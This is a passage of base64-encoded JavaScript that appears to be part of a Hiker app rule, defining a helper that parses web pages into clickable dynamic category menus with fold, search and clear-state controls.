uICAgICAgbGV0IHRpdGxlUnVsZSA9IGNhdGVnb3J5IHx8IFxcXCJhJiZUZXh0XFxcIjtcXG4gICAgICBpZiAodGl0bGVSdWxlLnN0YXJ0c1dpdGgoXFxcIkBqczpcXFwiKSkge1xcbiAgICAgICAgdGl0bGUgPSB0aGlzLmV2YWxKU1J1bGUoc3JjLCB0aXRsZVJ1bGUpO1xcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICB0aXRsZSA9IHBhcnNlRG9tRm9ySHRtbChzcmMsIHRpdGxlUnVsZSk7XFxuICAgICAgfVxcbiAgICAgIHJldHVybiB0aXRsZSB8fCBcXFwiXFxcIjtcXG4gICAgfSxcXG4gICAgZ2V0VXJsKHNyYywgY2F0ZWdvcnkpIHtcXG4gICAgICBsZXQgdXJsID0gXFxcIlxcXCI7XFxuICAgICAgbGV0IHVybFJ1bGUgPSBjYXRlZ29yeS7pk77mjqUgfHwgXFxcImEmJmhyZWZcXFwiO1xcbiAgICAgIGlmICh1cmxSdWxlLnN0YXJ0c1dpdGgoXFxcIkBqczpcXFwiKSkge1xcbiAgICAgICAgdXJsID0gdGhpcy5ldmFsSlNSdWxlKHNyYywgdXJsUnVsZSk7XFxuICAgICAgfSBlbHNlIHtcXG4gICAgICAgIHVybCA9IHBkKHNyYywgdXJsUnVsZSk7XFxuICAgICAgfVxcbiAgICAgIGlmICh0eXBlb2YgY2F0ZWdvcnku6ZO+5o6l5aSE55CGID09IFxcXCJmdW5jdGlvblxcXCIpIHtcXG4gICAgICAgIHVybCA9IGNhdGVnb3J5LumTvuaOpeWkhOeQhih1cmwpO1xcbiAgICAgIH1cXG4gICAgICByZXR1cm4gdXJsIHx8IFxcXCJcXFwiO1xcbiAgICB9LFxcbiAgICBpc051bGwocGFyYW0pIHtcXG4gICAgICBpZiAocGFyYW0gPT0gbnVsbCkge1xcbiAgICAgICAgcmV0dXJuIHRoaXM7XFxuICAgICAgfVxcbiAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgfSxcXG4gICAgaXNCb29sZWFuKHZhcmlhYmxlKSB7XFxuICAgICAgaWYgKHR5cGVvZiB2YXJpYWJsZSAhPT0gXFxcImJvb2xlYW5cXFwiKSB7XFxuICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuW8gOWQr+aKmOWPoOivt+S8oOWFpeW4g+WwlOWAvFxcXCIpO1xcbiAgICAgIH1cXG4gICAgfSxcXG4gICAg5riF6ZmkKGxpc3QpIHtcXG4gICAgICBpZiAodGhpcy5pc051bGwobGlzdCkpIHtcXG4gICAgICAgIHJldHVybiB0aGlzO1xcbiAgICAgIH1cXG4gICAgICBpZiAobGlzdC5jb25zdHJ1Y3RvciA9PSBTdHJpbmcpIHtcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi5riF6Zmk5oql6ZSZOuivt+S8oOWIl+ihqFxcXCIpO1xcbiAgICAgIH1cXG4gICAgICB0aGlzLmNsZWFycyA9IGxpc3Q7XFxuICAgICAgcmV0dXJuIHRoaXM7XFxuICAgIH0sXFxuICAgIOWFqOa4hShsaXN0KSB7XFxuICAgICAgaWYgKHRoaXMuaXNOdWxsKGxpc3QpKSB7XFxuICAgICAgICByZXR1cm4gdGhpcztcXG4gICAgICB9XFxuICAgICAgdmFyIGMgPSB0aGlzLmNsZWFyYWxsO1xcbiAgICAgIGxpc3QgPSBjLmNvbmNhdChsaXN0KTtcXG4gICAgICB0aGlzLmNsZWFyYWxsID0gbGlzdDtcXG4gICAgICByZXR1cm4gdGhpcztcXG4gICAgfSxcXG4gICAg5rqQ56CBKGlucHV0KSB7XFxuICAgICAgdGhpcy5odG1sID0gaW5wdXQ7XFxuICAgICAgcmV0dXJuIHRoaXM7XFxuICAgIH0sXFxuICAgIOeVjOmdoihpbnB1dCkge1xcbiAgICAgIHRoaXMubGF5b3V0ID0gaW5wdXQ7XFxuICAgICAgcmV0dXJuIHRoaXM7XFxuICAgIH0sXFxuICAgIOmhteeggShpbnB1dCkge1xcbiAgICAgIHRoaXMucGFnZSA9IGlucHV0O1xcbiAgICAgIHJldHVybiB0aGlzO1xcbiAgICB9LFxcbiAgICDnirbmgIEoaW5wdXQpIHtcXG4gICAgICB0aGlzLnN0YXRlID0gaW5wdXQ7XFxuICAgICAgcmV0dXJuIHRoaXM7XFxuICAgIH0sXFxuICAgIOW8gOWQr+aQnOe0oigpIHtcXG4gICAgICB0aGlzLnNlYXJjaCA9IHRydWU7XFxuICAgICAgcmV0dXJuIHRoaXM7XFxuICAgIH0sXFxuICAgIOW8gOWQr+aKmOWPoChpbnB1dCkge1xcbiAgICAgIGlmIChpbnB1dCA9PSB1bmRlZmluZWQpIHtcXG4gICAgICAgIGlucHV0ID0gdHJ1ZTtcXG4gICAgICB9XFxuICAgICAgdGhpcy5pc0Jvb2xlYW4oaW5wdXQpO1xcbiAgICAgIHRoaXMub3BlbiA9IGlucHV0O1xcbiAgICAgIHJldHVybiB0aGlzO1xcbiAgICB9LFxcbiAgICBzZXRUaXRsZShrLCBpLCB0KSB7XFxuICAgICAgcmV0dXJuIGsgPT0gaSA/IFxcXCLigJzigJzigJ3igJ1cXFwiICsgdC5mb250Y29sb3IodGhpcy7liIbnsbvpopzoibIpIDogdDtcXG4gICAgfSxcXG4gICAgYWN0aW9uKG9iaikge1xcbiAgICAgIHJldHVybiBbXFxuICAgICAgICB7XFxuICAgICAgICAgIHRpdGxlOiBcXFwi5riF6Zmk54q25oCBXFxcIixcXG4gICAgICAgICAganM6ICQudG9TdHJpbmcoKG9iaikgPT4ge1xcbiAgICAgICAgICAgIGxvZyhvYmopO1xcbiAgICAgICAgICAgIGNsZWFyTXlWYXIob2JqLnN0YXRlKTtcXG4gICAgICAgICAgICBjbGVhck15VmFyKFxcXCJoZWFkLmNhdGVcXFwiKTtcXG4gICAgICAgICAgICBvYmouYWxsLmZvckVhY2goKGl0ZW0pID0+IHtcXG4gICAgICAgICAgICAgIGNsZWFyTXlWYXIoaXRlbSk7XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgb2JqLmNsLmZvckVhY2goKGl0ZW0pID0+IHtcXG4gICAgICAgICAgICAgIGNsZWFyTXlWYXIoaXRlbSk7XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgfSwgb2JqKSxcXG4gICAgICAgIH0sXFxuICAgICAgXTtcXG4gICAgfSxcXG4gICAgY2hlY2tQYXJhbSgpIHtcXG4gICAgICB2YXIgb2JqID0ge307XFxuICAgICAgaWYgKHRoaXMucGFnZSA9PSAwICYmIHR5cGVvZiBwYWdlID09IFxcXCJ1bmRlZmluZWRcXFwiKSB7XFxuICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuivt+S8oOWFpemhteeggVxcXCIpO1xcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICBpZiAodHlwZW9mIHBhZ2UgPT0gXFxcInVuZGVmaW5lZFxcXCIpIHtcXG4gICAgICAgICAgb2JqW1xcXCLpobXnoIFcXFwiXSA9IHRoaXMucGFnZTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgIG9ialtcXFwi6aG156CBXFxcIl0gPSBwYWdlO1xcbiAgICAgICAgfVxcbiAgICAgIH1cXG4gICAgICBpZiAodGhpcy5odG1sID09IFxcXCJlbXB0eVxcXCIgJiYgdHlwZW9mIGh0bWwgPT0gXFxcInVuZGVmaW5lZFxcXCIpIHtcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi6K+35Lyg5YWl5rqQ56CBXFxcIik7XFxuICAgICAgfSBlbHNlIHtcXG4gICAgICAgIGlmICh0eXBlb2YgaHRtbCA9PSBcXFwidW5kZWZpbmVkXFxcIikge1xcbiAgICAgICAgICBvYmpbXFxcIua6kOeggVxcXCJdID0gdGhpcy5odG1sO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgb2JqW1xcXCLmupDnoIFcXFwiXSA9IGh0bWw7XFxuICAgICAgICB9XFxuICAgICAgfVxcbiAgICAgIGlmICh0aGlzLmxheW91dCA9PSBcXFwidW5kZWZpbmVkXFxcIiAmJiB0eXBlb2YgZCA9PSBcXFwidW5kZWZpbmVkXFxcIikge1xcbiAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCLor7fkvKDlhaXnlYzpnaJcXFwiKTtcXG4gICAgICB9IGVsc2Uge1xcbiAgICAgICAgaWYgKHR5cGVvZiBkID09IFxcXCJ1bmRlZmluZWRcXFwiKSB7XFxuICAgICAgICAgIG9ialtcXFwi55WM6Z2iXFxcIl0gPSB0aGlzLmxheW91dDtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgIG9ialtcXFwi55WM6Z2iXFxcIl0gPSBkO1xcbiAgICAgICAgfVxcbiAgICAgIH1cXG4gICAgICByZXR1cm4gb2JqO1xcbiAgICB9LFxcbiAgICDliJvlu7rliqjmgIHliIbnsbsocnVsZU9iaikge1xcbiAgICAgIGlmIChydWxlT2JqID09IHVuZGVmaW5lZCkge1xcbiAgICAgICAgcnVsZU9iaiA9IFtdO1xcbiAgICAgIH1cXG4gICAgICAvL+WIneWni+WMluWPmOmHj+W8gOWni1xcbiAgICAgIGNvbnN0IHBhcmFtID0gdGhpcy5jaGVja1BhcmFtKCk7XFxuICAgICAgY29uc3QgcGFnZSA9IHBhcmFtLumhteeggTtcXG4gICAgICBjb25zdCBodG1sID0gcGFyYW0u5rqQ56CBO1xcbiAgICAgIGNvbnN0IGQgPSBwYXJhbS7nlYzpnaI7XFxuICAgICAgY29uc3Qg54q25oCBID0gdGhpcy5zdGF0ZTtcXG4gICAgICBjb25zdCBzZWFyY2ggPSB0aGlzLnNlYXJjaDtcXG4gICAgICBjb25zdCBlbXB0eSA9IFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICBjb25zdCDmipjlj6DnirbmgIEgPSB0aGlzLm9wZW47XFxuICAgICAgdmFyIOWxleW8gCA9IHRoaXMu5bGV5byAO1xcbiAgICAgIHZhciDmipjlj6AgPSB0aGlzLuaKmOWPoDtcXG4gICAgICB2YXIg5YWo5riFID0gdGhpcy5jbGVhcmFsbDtcXG4gICAgICB2YXIg5riF6ZmkID0gdGhpcy5jbGVhcnM7XFxuICAgICAgLy/liJ3lp4vljJblj5jph4/nu5PmnZ9cXG4gICAgICBsZXQgaW5pdF9jYXRlID0gbmV3IEFycmF5KDIwKS5maWxsKFxcXCIwXFxcIik7XFxuICAgICAgY29uc3QgZm9sZCA9IGdldE15VmFyKE1ZX1JVTEUuZ3JvdXAsIFxcXCIwXFxcIik7XFxuICAgICAgY29uc3QgY2F0ZV90ZW1wID0gSlNPTi5wYXJzZShcXG4gICAgICAgIGdldE15VmFyKFxcXCJoZWFkLmNhdGVcXFwiLCBKU09OLnN0cmluZ2lmeShpbml0X2NhdGUpKVxcbiAgICAgICk7XFxuICAgICAgaWYgKHNlYXJjaCAmJiBwYWdlID09IDEpIHtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgICAgICAgdXJsOiBcXFwiJ2hpa2VyOi8vc2VhcmNoP3J1bGU9XFxcIiArIE1ZX1JVTEUudGl0bGUgKyBcXFwiJnM9JytpbnB1dFxcXCIsXFxuICAgICAgICAgIGRlc2M6IFxcXCLmkJzntKLlhbPplK7or41cXFwiLFxcbiAgICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKFxcXCJrZXl3b3JkXFxcIiwgXFxcIlxcXCIpLFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJrZXl3b3JkXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICB9LFxcbiAgICAgICAgfSk7XFxuICAgICAgfVxcbiAgICAgIGNvbnN0IGNhdGVnb3JpZXMgPSBbXTtcXG4gICAgICBydWxlT2JqLmZvckVhY2goKHgpID0+IHtcXG4gICAgICAgIHZhciBsaXN0ID0gW107XFxuICAgICAgICBpZih4LuS4gOe6p+WumuS9jSl7XFxuICAgICAgICAgIGlmICh4LuS4gOe6p+WumuS9jS5zdGFydHNXaXRoKFxcXCJAanM6XFxcIikpIHtcXG4gICAgICAgICAgbGlzdCA9IHRoaXMuZXZhbEpTUnVsZShodG1sLCB4LuS4gOe6p+WumuS9jSk7XFxuICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgbGlzdCA9IHBkZmEoaHRtbCwgeC7kuIDnuqflrprkvY0pO1xcbiAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICBpZih4LuWkp+exu+WumuS9jSl7XFxuICAgICAgICAgIGlmICh4LuWkp+exu+WumuS9jS5zdGFydHNXaXRoKFxcXCJAanM6XFxcIikpIHtcXG4gICAgICAgICAgbGlzdCA9IHRoaXMuZXZhbEpTUnVsZShodG1sLCB4LuWkp+exu+WumuS9jSk7XFxuICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgbGlzdCA9IFtwZGZhKGh0bWwsIHgu5aSn57G75a6a5L2NKS5qb2luKCdcXFxcbicpXTtcXG4gICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICB2YXIg5LiA57qnID0gbGlzdC5tYXAoKHMpID0+IHtcXG4gICAgICAgICAgdmFyIHNsaXN0ID0gW107XFxuICAgICAgICAgIGlmICghKFxcXCLlsI/nsbtcXFwiIGluIHgpKSB7XFxuICAgICAgICAgICAgeC7lsI/nsbsgPSBcXFwiYm9keSYmYTpub3QoOm1hdGNoZXMo6aaW6aG1KSk6bm90KGE6bm90KFtocmVmXSkpXFxcIjtcXG4gICAgICAgICAgfVxcbiAgICAgICAgICBpZiAoeC7lsI/nsbsuc3RhcnRzV2l0aChcXFwiQGpzOlxcXCIpKSB7XFxuICAgICAgICAgICAgc2xpc3QgPSB0aGlzLmV2YWxKU1J1bGUocywgeC7lsI/nsbspO1xcbiAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHNsaXN0ID0gcGRmYShzLCB4LuWwj+exuyk7XFxuICAgICAgICAgIH1cXG4gICAgICAgICAgdmFyIOWumuS9jSA9IHNsaXN0Lm1hcCgoaXRlbSkgPT4ge1xcbiAgICAgICAgICAgIHZhciB0aXRsZSA9IHRoaXMuZ2V0VGl0bGUoaXRlbSwgeC7moIfpopgpO1xcbiAgICAgICAgICAgIHZhciB1cmwgPSB0aGlzLmdldFVybChpdGVtLCB4KTtcXG4gICAgICAgICAgICB2YXIgb2JqID0geyB0aXRsZTogdGl0bGUsIHVybDogdXJsIH07XFxuICAgICAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KG9iaik7XFxuICAgICAgICAgIH0pO1xcbiAgICAgICAgICByZXR1cm4g5a6a5L2NO1xcbiAgICAgICAgfSk7XFxuICAgICAgICAvL2xvZyjkuIDnuqcpXFxuICAgICAgICAvL2xvZyjkuIDnuqcubGVuZ3RoKVxcbiAgICAgICAgaWYgKOS4gOe6py5sZW5ndGggPT0gMSkge1xcbiAgICAgICAgICBjYXRlZ29yaWVzLnB1c2go5LiA57qnLmpvaW4oXFxcIlxcXFxuXFxcIikpO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAg5LiA57qnLmZvckVhY2goKGl0ZW0pID0+IHtcXG4gICAgICAgICAgICBjYXRlZ29yaWVzLnB1c2goaXRlbS5qb2luKFxcXCIsXFxcIikpO1xcbiAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICAgIC8vbG9nKGNhdGVnb3JpZXMpXFxuICAgICAgfSk7XFxuICAgICAgaWYgKOaKmOWPoOeKtuaAgSkge1xcbiAgICAgICAgaWYgKHBhZ2UgPT0gMSkge1xcbiAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBmb2xkID09PSBcXFwiMVxcXCIgPyDmipjlj6AgOiDlsZXlvIAsXFxuICAgICAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKFxcbiAgICAgICAgICAgICAgKGZvbGQsIHUsIGFsbCkgPT4ge1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihNWV9SVUxFLmdyb3VwLCBmb2xkID09PSBcXFwiMVxcXCIgPyBcXFwiMFxcXCIgOiBcXFwiMVxcXCIpO1xcbiAgICAgICAgICAgICAgICAvKmFsbC5mb3JFYWNoKChpdGVtKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcihpdGVtKTtcXG4gICAgICAgICAgICAgICAgfSk7Ki9cXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgIGZvbGQsXFxuICAgICAgICAgICAgICDnirbmgIEsXFxuICAgICAgICAgICAgICDlhajmuIVcXG4gICAgICAgICAgICApLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgIGxvbmdDbGljazogdGhpcy5hY3Rpb24oe1xcbiAgICAgICAgICAgICAgICBzdGF0ZTog54q25oCBLFxcbiAgICAgICAgICAgICAgICBhbGw6IOWFqOa4hSxcXG4gICAgICAgICAgICAgICAgY2w6IOa4hemZpCxcXG4gICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgIH0sXFxuICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICAgIH1cXG4gICAgICBpZiAocGFnZSA9PSAxKSB7XFxuICAgICAgY2F0ZWdvcmllcy5mb3JFYWNoKChjYXRlZ29yeSwgaW5kZXgpID0+IHtcXG4gICAgICAgIC8vbG9nKGNhdGVnb3JpZXMpXFxuICAgICAgICBsZXQgc3ViX2NhdGVnb3JpZXMgPSBbXTtcXG4gICAgICAgIC8qaWYgKOWwj+exu+WumuS9jS5pbmNsdWRlcyhcXFwiO1xcXCIpKSB7XFxuICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzID0gcGRmYShjYXRlZ29yeSwg5bCP57G75a6a5L2NLnNwbGl0KFxcXCI7XFxcIilbMF0pO1xcbiAgICAgICAgICBpZiAoc3ViX2NhdGVnb3JpZXMubGVuZ3RoID09IDApIHtcXG4gICAgICAgICAgICBzdWJfY2F0ZWdvcmllcyA9IHBkZmEoY2F0ZWdvcnksIOWwj+exu+WumuS9jS5zcGxpdChcXFwiO1xcXCIpWzFdKTtcXG4gICAgICAgICAgfVxcbiAgICAgICAgfSBlbHNlIHsqL1xcbiAgICAgICAgLy9sb2coaW5kZXgpXFxuICAgICAgICBzdWJfY2F0ZWdvcmllcyA9IEpTT04ucGFyc2UoYFske2NhdGVnb3J5fV1gKTtcXG4gICAgICAgIC8vIHN1Yl9jYXRlZ29yaWVzID0gcGRmYShjYXRlZ29yeSwg5bCP57G75a6a5L2NKTtcXG4gICAgICAgIC8vfVxcbiAgICAgICAgaWYgKGluZGV4ID09PSAwKSB7XFxuICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzLmZvckVhY2goKGl0ZW0sIGtleSkgPT4ge1xcblxcbiAgICAgICAgICAgIC8vbGV0IHRpdGxlID0gcGRmaChpdGVtLCBf5aSn57G75qCH6aKYKTtcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSBpdGVtLnRpdGxlO1xcbiAgICAgICAgICAgIGlmICh0eXBlb2Yg5o6S6ZmkICE9IFxcXCJ1bmRlZmluZWRcXFwiICYmIOaOkumZpCAhPSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgICAgdGl0bGUgPSB0aXRsZS5yZXBsYWNlKG5ld1JlZ0V4cCjmjpLpmaQsIFxcXCJnXFxcIiksIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgbGV0IGpzb249JydcXG4gICAgICAgICAgICBqc29uID0gaXRlbS51cmw7XFxuICAgICAgICAgICAgXFxuICAgICAgICAgICAgbGV0IHBhcmFtcyA9IHtcXG4gICAgICAgICAgICAgIGNhdGVfdGVtcDogY2F0ZV90ZW1wLFxcbiAgICAgICAgICAgICAga2V5OiBrZXksXFxuICAgICAgICAgICAgICBwYWdlOiBwYWdlLFxcbiAgICAgICAgICAgICAgY2xlYXJzOiDmuIXpmaQsXFxuICAgICAgICAgICAgICBqc29uOiBqc29uLFxcbiAgICAgICAgICAgICAgc3RhdGU6IOeKtuaAgSxcXG4gICAgICAgICAgICAgIGFsbGNsZWFyczog5YWo5riFLFxcbiAgICAgICAgICAgIH07XFxuXFxuICAgICAgICAgICAgLy9sZXQgdXJsID0gcGQoaXRlbSwgX+Wkp+exu+mTvuaOpSk7XFxuICAgICAgICAgICAgbGV0IHVybCA9IGl0ZW0udXJsO1xcbiAgICAgICAgICAgIC8qaWYgKOWkp+exu+WkhOeQhikge1xcbiAgICAgICAgICAgICAgdXJsID0g5LiA57qn5YiG57G75aSE55CGKHVybCk7XFxuICAgICAgICAgICAgfSovXFxuICAgICAgICAgICAgLy9sb2codXJsKVxcbiAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICB0aXRsZTogdGhpcy5zZXRUaXRsZShrZXkudG9TdHJpbmcoKSwgY2F0ZV90ZW1wW2luZGV4XSwgdGl0bGUpLFxcbiAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIixcXG4gICAgICAgICAgICAgIHVybDogJChcXFwiaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHBhcmFtcykgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgbmV3X2NhdGUgPSBbXTtcXG4gICAgICAgICAgICAgICAgcGFyYW1zLmNsZWFycy5mb3JFYWNoKChpdGVtKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcihpdGVtKTtcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIHBhcmFtcy5hbGxjbGVhcnMuZm9yRWFjaCgoaXRlbSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoaXRlbSk7XFxuICAgICAgICAgICAgICAgIH0pO1xcblxcbiAgICAgICAgICAgICAgICBwYXJhbXMuY2F0ZV90ZW1wLmZvckVhY2goKGNhdGUsIGluZGV4KSA9PiB7XFxuICAgICAgICAgICAgICAgICAgbmV3X2NhdGUucHVzaChpbmRleCA9PT0gMCA/IHBhcmFtcy5rZXkudG9TdHJpbmcoKSA6IFxcXCIwXFxcIik7XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaGVhZC5jYXRlXFxcIiwgSlNPTi5zdHJpbmdpZnkobmV3X2NhdGUpKTtcXG4gICAgICAgICAgICAgICAgaWYgKHBhcmFtcy5qc29uLmNvbnN0cnVjdG9yID09PSBPYmplY3QpIHtcXG4gICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiZHRfXFxcIiArIHBhcmFtcy5qc29uLnR5cGUsIHBhcmFtcy5qc29uLnZhbHVlKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICBwdXRNeVZhcihwYXJhbXMuc3RhdGUsIHBhcmFtcy5qc29uKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSh0cnVlKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgICAgICAgIH0sIHBhcmFtcyksXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgIH0pO1xcbiAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiLFxcbiAgICAgICAgICB9KTtcXG4gICAgICAgIH0gZWxzZSBpZiAoZm9sZCA9PT0gXFxcIjFcXFwiIHx8IOaKmOWPoOeKtuaAgSA9PSBmYWxzZSkge1xcbiAgICAgICAgICBzdWJfY2F0ZWdvcmllcy5mb3JFYWNoKChpdGVtLCBrZXkpID0+IHtcXG4gICAgICAgICAgICB2YXIgZXh0cmFwb3MgPSBmYWxzZTtcXG4gICAgICAgICAgICAvKmlmIChpdGVtLmluY2x1ZGVzKCd0eXBlPVxcXCJAZXh0cmFcXFwiJykpIHtcXG4gICAgICAgICAgICAgIGV4dHJhcG9zID0gdHJ1ZTtcXG4gICAgICAgICAgICAgIC8vbG9nKCfpmYTliqDlrprkvY0nKVxcbiAgICAgICAgICAgIH0qL1xcblxcbiAgICAgICAgICAgIGlmIChleHRyYXBvcykge1xcbiAgICAgICAgICAgICAgdmFyIHRpdGxlID0gcGRmaChpdGVtLCBcXFwiYSYmVGV4dFxcXCIpO1xcbiAgICAgICAgICAgICAgaWYgKHR5cGVvZiDmjpLpmaQgIT0gXFxcInVuZGVmaW5lZFxcXCIgJiYg5o6S6ZmkICE9IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHRpdGxlID0gdGl0bGUucmVwbGFjZShuZXcgUmVnRXhwKOaOkumZpCwgXFxcImdcXFwiKSwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgdmFyIGpzb24gPSB7XFxuICAgICAgICAgICAgICAgIHR5cGU6IHBkZmgoaXRlbSwgXFxcImEmJnN0YXRlXFxcIiksXFxuICAgICAgICAgICAgICAgIHZhbHVlOiBwZGZoKGl0ZW0sIFxcXCJhJiZ2YWx1ZVxcXCIpLFxcbiAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgLy92YXIgdGl0bGUgPSBwZGZoKGl0ZW0sIOWIhuexu+agh+mimCk7XFxuICAgICAgICAgICAgICB2YXIgdGl0bGUgPSBpdGVtLnRpdGxlO1xcbiAgICAgICAgICAgICAgaWYgKHR5cGVvZiDmjpLpmaQgIT0gXFxcInVuZGVmaW5lZFxcXCIgJiYg5o6S6ZmkICE9IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHRpdGxlID0gdGl0bGUucmVwbGFjZShuZXcgUmVnRXhwKOaOkumZpCwgXFxcImdcXFwiKSwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgfVxcblxcbiAgICAgICAgICAgICAgdmFyIGpzb24gPSBcXFwiXFxcIjtcXG4gICAgICAgICAgICAgIC8qc3dpdGNoICh0cnVlKSB7XFxuICAgICAgICAgICAgICAgIGNhc2Ug5YiG57G76ZO+5o6lLmluY2x1ZGVzKFxcXCJAQEBcXFwiKTpcXG4gICAgICAgICAgICAgICAgICBqc29uID0ge1xcbiAgICAgICAgICAgICAgICAgICAgdHlwZTogcGRmaChpdGVtLCDliIbnsbvpk77mjqUuc3BsaXQoXFxcIkBAQFxcXCIpWzBdKSxcXG4gICAgICAgICAgICAgICAgICAgIHZhbHVlOiBwZGZoKGl0ZW0sIOWIhuexu+mTvuaOpS5zcGxpdChcXFwiQEBAXFxcIilbMV0pLFxcbiAgICAgICAgICAgICAgICAgIH07XFxuICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgIGNhc2Ug5YiG57G76ZO+5o6lLmluY2x1ZGVzKFxcXCJAQFxcXCIpOlxcbiAgICAgICAgICAgICAgICAgIGpzb24gPSB7XFxuICAgICAgICAgICAgICAgICAgICB0eXBlOiDliIbnsbvpk77mjqUuc3BsaXQoXFxcIkBAXFxcIilbMF0sXFxuICAgICAgICAgICAgICAgICAgICB2YWx1ZTogcGRmaChpdGVtLCDliIbnsbvpk77mjqUuc3BsaXQoXFxcIkBAXFxcIilbMV0pLFxcbiAgICAgICAgICAgICAgICAgIH07XFxuICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgIGRlZmF1bHQ6XFxuICAgICAgICAgICAgICAgICAganNvbiA9IGl0ZW0udXJsO1xcbiAgICAgICAgICAgICAgICAgIC8vIGpzb24gPSBwZChpdGVtLCDliIbnsbvpk77mjqUpO1xcbiAgICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgICAgfSovXFxuICAgICAgICAgICAgICBqc29uID0gaXRlbS51cmw7XFxuICAgICAgICAgICAgICAvKnZhciBqc29uPeWIhuexu+mTvuaOpS5pbmNsdWRlcygnQEBAJyk/e1xcbiAgICAgICAgICAgICAgICAgICAgdHlwZTpwZGZoKGl0ZW0s5YiG57G76ZO+5o6lLnNwbGl0KCdAQEAnKVswXSksXFxuICAgICAgICAgICAgICAgICAgICB2YWx1ZTpwZGZoKGl0ZW0s5YiG57G76ZO+5o6lLnNwbGl0KCdAQEAnKVsxXSksXFxuICAgICAgICAgICAgICAgIH06cGQoaXRlbSzliIbnsbvpk77mjqUpO1xcbiAgICAgICAgICAgICAgICBcXG4gICAgICAgICAgICAgICAganNvbj3liIbnsbvpk77mjqUuaW5jbHVkZXMoJ0BAJyk/e1xcbiAgICAgICAgICAgICAgICAgICAgdHlwZTrliIbnsbvpk77mjqUuc3BsaXQoJ0BAJylbM